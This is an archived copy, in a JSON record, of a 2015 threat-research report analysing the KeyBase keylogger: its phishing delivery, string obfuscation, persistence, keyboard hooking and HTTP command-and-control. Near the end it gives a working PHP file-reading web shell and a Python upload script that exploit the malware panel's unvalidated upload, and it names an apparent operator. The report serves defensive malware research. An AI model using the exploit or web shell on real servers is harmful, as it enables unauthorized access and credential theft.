{
    "id": "06c30ead-1136-4a4c-94c5-4bdb1401f899",
    "created_at": "2023-01-12T15:00:27.410489Z",
    "updated_at": "2025-03-27T02:05:53.794136Z",
    "deleted_at": null,
    "sha1_hash": "a37dadad3266b8548d0332b458b45ee0fbe35fe8",
    "title": "2015-06-04 - KeyBase Keylogger Malware Family Exposed",
    "authors": "",
    "file_creation_date": "2022-05-29T00:59:24Z",
    "file_modification_date": "2022-05-29T00:59:24Z",
    "file_size": 861406,
    "plain_text": "# KeyBase Keylogger Malware Family Exposed\n\n**[unit42.paloaltonetworks.com/keybase-keylogger-malware-family-exposed/](https://unit42.paloaltonetworks.com/keybase-keylogger-malware-family-exposed/)**\n\nUnit 42 June 4, 2015\n\nBy [Unit 42](https://unit42.paloaltonetworks.com/author/unit42/)\n\nJune 4, 2015 at 2:21 PM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Threat Prevention,](https://unit42.paloaltonetworks.com/category/threat-prevention-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [419 Evolution,](https://unit42.paloaltonetworks.com/tag/419-evolution/) [AutoFocus,](https://unit42.paloaltonetworks.com/tag/autofocus/) [hackforums.net,](https://unit42.paloaltonetworks.com/tag/hackforums-net/) [KeyBase,](https://unit42.paloaltonetworks.com/tag/keybase/) [KeyHook,](https://unit42.paloaltonetworks.com/tag/keyhook/) [Keylogger,](https://unit42.paloaltonetworks.com/tag/keylogger/) [WildFire](https://unit42.paloaltonetworks.com/tag/wildfire/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/keybase-keylogger-malware-family-exposed/)\n\nIn recent months, our team has been tracking a keylogger malware family named KeyBase\nthat has been in the wild since February 2015. The malware comes equipped with a variety\nof features and can be purchased for $50 directly from the author. It has been deployed in\nattacks against organizations across many industries and is predominantly delivered via\nphishing emails.\n\n[In total, Palo Alto Networks AutoFocus threat intelligence service identified 295 unique](http://media.paloaltonetworks.com/lp/autofocus/)\nsamples over roughly 1,500 unique sessions in the past four months. Attacks have primarily\ntargeted the high tech, higher education, and retail industries.\n\n## Malware Distribution and Targets\n\nKeyBase was first observed in mid-February of 2015. Shortly before then, the domain\n‘keybase[.]in’, was registered as a homepage and online store for the KeyBase keylogger.\n\nDomain Name:KEYBASE.IN\n\nCreated On:04-Feb-2015 08:27:44 UTC\n\nLast Updated On:05-Apr-2015 19:20:38 UTC\n\nExpiration Date:04-Feb-2016 08:27:44 UTC\n\nThis activity is in-line with an initial posting made by a user with the handle ‘Support™’\n[announcing KeyBase on the hackforums.net forum on February 7, 2015. In the forum post,](http://www.hackforums.net/member.php?action=profile&uid=218524)\nthe malware touts the following features:\n\nAdvanced Keylogger\nFully undetected scan-time and run-time (Later removed)\nUser-friendly web-panel\nUnicode support\n\n\n-----\n\nPassword recovery\n\nFigure 1. KeyBase posting on hackforums.net\n\n[Since February 2015, approximately 1,500 sessions carrying KeyBase have been captured](https://autofocus.paloaltonetworks.com/#/tag/Commodity.KeyBase)\nby WildFire, as we can see below:\n\nFigure 2. KeyBase timeline in AutoFocus\n\nWe can also quickly determine targeted industries using AutoFocus:\n\nFigure 3. Targeted industries in AutoFocus\n\nThe targeted companies span the globe and are located in many countries.\n\n\n-----\n\nFigure 4. Targeted countries in AutoFocus\n\nThis malware is primarily delivered via phishing emails using common lures. Some examples\nof attachment filenames can be seen below:\n\nPurchase Order.exe\nNew Order.exe\nDocument 27895.scr\nPayment document.exe\nPO #7478.exe\nOverdue Invoices.exe\n\nOne such example of an email delivering KeyBase can be seen below.\n\nFigure 5. KeyBase phishing email\n\n\n-----\n\nOverall, Unit 42 has seen a large number of separate campaigns using KeyBase. As the\nsoftware can be easily purchased by anyone, this comes as no surprise. As we can see in\nthe following diagram, around 50 different command and control (C2) servers have been\nidentified with up to as many as 50 unique samples connecting to a single C2.\n\nFigure 6. KeyBase campaign diagram\n\n## Malware Overview\n\nKeyBase itself is written in C# using the .NET Framework. These facts allowed us to\ndecompile the underlying code and identify key functionality and characteristics of the\nkeylogger.\n\n\n-----\n\nFigure 7. KeyBase logo\n\nFunctionality in KeyBase includes the following:\n\nDisplay a website on startup\nScreenshots\nDownload/Execute\nPersistence\nKill Timer\n\nWhen the malware is initially executed, a series of threads are spawned.\n\n\n-----\n\nFigure 8. KeyBase main function\n\nThe various functions spawned in new threads may be inert based on options specified by\nthe attacker during the build. Should a feature not be enabled, a function looks similar to the\nfollowing:\n\nFigure 9. Inert functions in KeyBase\n\n\n-----\n\nFigure 10. KeyBase builder\n\nThe author makes use of a number of simple obfuscation techniques on various strings used\nwithin the code. Examples of this include replacing single characters that have been added\nto strings, as well as performing reverse operations on strings.\n\nFigure 11. String obfuscation using replace\n\n\n-----\n\nFigure 12. String obfuscation using reverse\n\nAdditionally, the author makes use of an ‘Encryption’ class. This class is used to decrypt a\nnumber of strings found within the code.\n\nFigure 13. KeyBase Encryption class\n\n\n-----\n\nReferences to this decompiled code were discovered in an old posting on hackforums.net,\nwhere the user ‘Ethereal’ provided sample code.\n\nFigure 14. Encryption code posting on hackforums.net\n\nWe see the ‘DecryptText’ function used by the author when he/she dynamically loads a\nnumber of Microsoft Windows APIs.\n\nFigure 15. Obfuscated API functions in KeyBase\n\nThe following Python code can be used to decrypt these strings.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n#!/usr/bin/python\n# -*- coding: utf-8 -*\nstrings = [ u\"ĈőŘĝŏŒįķŎŖġŎŠĠz\", \\\nu\"ŝƕƸšƔưƕŷƔƇżƚƲƕƎƤË\", \\\nu\"ķůƒĻŮƊůőŮšŖŴƌůŨž¥\", \\\nu\"ńŰƓļůƋŰŒůŢŗŵƍŰũſ¦\", \\\nu\"ŨƚƶľśƌƐƅſƧźƌƚƏŔƚƭżƌƱƟÆ\", \\\nu\"ĴšűĽňżūŅšƃŌŅůũőŮƉ\\u0097\", \\\nu\"ŇżƇśūŨżşŭƃŚŹťůŝŹƐŠ¥\", \\\nu\"ıűŦňŦŬŭĹŦŶőňűŐňŠƅŃŨŹ\\u0098\", \\\nu\"ńűƎřŹŷŴįŴƈŔŧśƀ£\", \\\nu\"ŵƢǄƏƦưƑƋƯƶŻƝØ\" ]\n\nkey = 'KeyBase'\n\ndef dec(str, key):\nkey_len = len(key)\nout = \"\"\nfor c, s in enumerate(str[:-1]):\nout += chr(ord(s) - ord(key[c%key_len]) - ord(str[-1]))\nreturn out\n\nfor s in strings:\nprint \"Decoded: %25s | Encoded: %s\" % (dec(s, key), repr(s))\n\n\n## Persistence\n\nPersistence in KeyBase, should it be enabled, is achieved using two techniques—copying\nthe malware to the startup folder or setting the Run registry key to autorun on startup. When\nKeyBase copies itself to the startup folder, it names itself ‘Important.exe.’ This is statically set\nby the author and cannot be changed by the user in the current version. The key used in the\nfollowing Run registry key is set by the user, and is always a 32 byte hexadecimal value.\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run [32 byte key] : [Path to Executable]\n\n## Keylogging\n\nKeylogging in KeyBase is primarily accomplished in a separate class appropriately named\n[‘KeyHook.’ While the class shares a name with a publicly available repository on github, the](https://github.com/Aristocat/KeyHook)\nclass appears to be custom written. While custom, the class itself uses a very common\n[technique of using the Microsoft Windows SetWindowsHookExA in order to hook the victim’s](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990%28v=vs.85%29.aspx)\nkeyboard.\n\n\n-----\n\nFigure 16. Hooking keyboard via SetWindowsHookExA\n\nThe author proceeds to handle appropriate keyboard events as expected.\n\nFigure 17. Handling keyboard events\n\nThe class also has the ability to handle Unicode characters, as well as get the name of the\nforeground window. This allows the malware to not only identify what keys are being\npressed, but what application said key presses are being sent to.\n\n## Command and Control (C2)\n\nAll communication with a remote server takes place via HTTP. Data is not encrypted or\nobfuscated in any way. Upon initial execution, KeyBase will perform an initial check-in to the\nremote server, as we can see below.\n\n\n-----\n\nFigure 18. Initial KeyBase notification HTTP GET request\n\nA number of HTTP headers are not included with the request. This provides a simple\ntechnique for flagging the activity as malicious. It is also important to note that it is fairly\nelementary to detect the activity using the hardcoded GET variables included in the request.\nWhile the victim machine name and the current time will vary, the remainder of the request\nwill remain static.\n\nKeyBase may also send the following data back to its C2 server:\n\nKeystrokes\nClipboard\nScreenshots\n\nExamples of this data can be seen below.\n\nFigure 19. KeyBase uploading clipboard data\n\nFigure 20. KeyBase uploading keystroke data\n\nDuring this communication with its C2 server, KeyBase will include the raw clipboard and\nkeystroke log data using various GET parameters. This data is URI-encoded, but otherwise\nsent in the clear.\n\nFinally, Keybase will also use a specific URI to upload screenshots. The path\n‘/image/upload.php’ is hardcoded within the malware. All images sent back to its C2 server\nwill be placed within the ‘/image/Images/’ path. Uploaded data is once again sent\nunencrypted, as we can see below.\n\n\n-----\n\nFigure 21. KeyBase uploading screenshot image\n\n## Web Panel\n\nThe web panel itself does not provide any innovative characteristics. It uses a simple\nred/grey color scheme as seen below.\n\nFigure 22. KeyBase web panel\n\nThe panel does allow the attacker to quickly view infected machines, keystrokes,\nscreenshots, clipboard data, and password data. Unfortunately, the author of KeyBase does\nnot make use of pagination, which results in poor performance in the event a large amount of\ndata is being displayed to the attacker.\n\n## Interesting Discoveries\n\nDuring the course of our research, Unit 42 discovered that no authentication was required\nwhen viewing the ‘/image/Images/’ path. One C2 server in particular stood out because it\nappeared the operator was testing KeyBase on his/her local machine. As such, screenshots\nof his machine were uploaded to his server and could be viewed by the general public. In the\nscreenshot below, we can clearly see the ‘KeyBase v1.0’ folder. This folder almost certainly\ncontains the KeyBase installation. While viewing the operator’s desktop, we can also see a\nnumber of other keyloggers, such as ‘HawkEye Keylogger’ and ‘Knight Logger’. Also of note\nis a popular crypter named ‘AegisCrypter’. Finally, we can also see that the user engages in\npiracy, as copies of both ‘The Hobbit’ and ‘Fury’ appear on the desktop as well.\n\n\n-----\n\nFigure 23. KeyBase operator desktop screenshot\n\nWhile continuing to examine the uploaded images, we also identify the user logging into a\nWindows Web Server 2008 R2 instance via remote desktop. This appears to be where the\nattacker is launching their spam campaigns using an instance of ‘Turbo-Mailer 2.7.10’.\nUnfortunately, it appears the operator had forgotten his/her username/password at this\nparticular moment.\n\nFigure 24. KeyBase operator sending phishing emails\n\nFurther examination of the uploaded screenshots shows activity of the user logging into\nhis/her Facebook account. The user looks to be named ‘China Onyeali’ and is observed\ndiscussing some of his/her latest endeavors. Specifically, we see a link to a .rar file hosted on\n[rghost[.]net containing the following file. We also see the operator discussing the HawkEye](https://www.virustotal.com/en/file/1d8173c15551c1adffe0613dd420228ba46e0a792c520230df4152c0c9bc6199/analysis/)\nkeylogger in another chat window. The operator’s Facebook page claims that he/she lives in\n\n\n-----\n\nMbieri, Nigeria. We previously reported on Nigerian actors using off-the-shelf tools to attack\n[business in our 419 Evolution report last July. This user has been reported to the Facebook](https://paloaltonetworks.com/resources/research/419evolution.html)\nsecurity team.\n\nFigure 25. KeyBase operator logged into Facebook\n\n## Further Interesting Discoveries\n\nOther interesting discoveries were made while researching the backend C2 code. In\nparticular, the upload.php file was examined and analyzed, as this file handles file uploads to\nthe server. As we can see, there is no validation for the types of files uploaded to the remote\nserver.\n\nFigure 26. KeyBase screenshot upload PHP script\n\nThis poses an issue from a security perspective, as a third party can simply upload a PHP\nscript to the ‘/image/Images/’ directory to gain unauthorized access. The following PHP code\ncan be used to read the KeyBase ‘config.php’ script, which contains the username and\npassword for the web panel.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n<?php\n$file = '../../config.php';\n\necho \"It works!\".\"</br>\";\n\nif (file_exists($file)) {\necho \"Reading file\".\"</br>\";\necho file_get_contents($file);\n}\n?>\n\n\nAdditionally, the following Python code can be used to upload this file and read the results.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nimport requests\nimport sys\n\nif len(sys.argv) != 2:\nprint \"Usage: %s [php_file]\" % __file__\nsys.exit(1)\n\nURL = \"\"\nprint \"Sending request...\"\n\nmultiple_files = [('file', ('WIN-JJFOIJGL_6_5_14_22_2.php', open(sys.argv[1], 'rb')))]\n\nr = requests.post(URL + \"image/upload.php\", files=multiple_files)\nprint \"Results:\"\nprint\n\nr = requests.get(URL + \"image/Images/WIN-JJFOIJGL_6_5_14_22_2.php\")\nprint r.text\n\n\n## Conclusion\n\nOverall, this KeyBase malware is quite unsophisticated. It lacks a number of features\navailable in some of the more popular malware families, and the C2 web panel contains\nsecurity vulnerabilities that could allow a third party to gain unauthorized access. The builder\nfor KeyBase provides an easy-to-use, user-friendly interface; however, a number of options\nare hardcoded into the malware itself. Some examples include the filename KeyBase uses\nwhen it is copied to maintain persistence, and various URI paths it uses during the command\nand control phase.\n\nWhile this malware has some issues with sophistication, Unit 42 has observed a significant\nand continued rise in usage by attackers, generally targeting the high tech, higher education,\nand retail industries. Palo Alto Networks customers are protected via WildFire, which is able\nto detect KeyBase as malicious. Readers may also use the indicators provided to deploy\nprotections.\n\n\n-----\n\nFor a list of sample hashes and their associated domains and IP addresses, please see the\n[following link.](https://github.com/pan-unit42/iocs/blob/master/keybase/keybase_ioc.csv)\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "ES",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-06-04 - KeyBase Keylogger Malware Family Exposed.pdf"
    ],
    "report_names": [
        "2015-06-04 - KeyBase Keylogger Malware Family Exposed.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535627,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653785964,
    "ts_modification_date": 1653785964,
    "files": {
        "pdf": "https://archive.orkl.eu/a37dadad3266b8548d0332b458b45ee0fbe35fe8.pdf",
        "text": "https://archive.orkl.eu/a37dadad3266b8548d0332b458b45ee0fbe35fe8.txt",
        "img": "https://archive.orkl.eu/a37dadad3266b8548d0332b458b45ee0fbe35fe8.jpg"
    }
}